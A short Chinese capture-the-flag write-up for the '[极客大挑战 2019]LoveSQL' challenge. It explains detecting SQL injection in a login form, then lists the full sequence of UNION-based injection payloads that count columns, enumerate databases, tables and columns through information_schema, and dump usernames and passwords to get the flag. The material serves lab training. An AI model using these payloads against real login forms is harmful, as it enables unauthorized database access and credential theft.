  • 题目：[极客大挑战 2019]LoveSQL
    []
  • 分析
    传入username=1'&&password=1'发现报错，所以可以的得出两处均存在sql注入，再次传入username=1"&&password=1",发现没有报错，而是NO,Wrong username password！！！
    接下来按流程走一走：

    测试字段数
    测回显位
    查询库名
    查询表名
    查询列名
    列中数据

  • 解
    username=1' order by 1,2,3,4# 得到Unknown column '4' in 'order clause'说明三个字段；
    username=1' union select 1,2,3#得到
    说明回显位在2，3处。
    username=1' union select 1,2,(select group_concat(schema_name) from information_schema.schemata)#得到所有的库名
    username=1' union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema='geek')#获取geek库下的表名

    username=1' union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name='l0ve1ysq1')#获取l0ve1ysq1表下的列名
    username=1' union select 1,2,(select group_concat(id,0x3a,username,0x3a,password) from geek.l0ve1ysq1)#得到flag
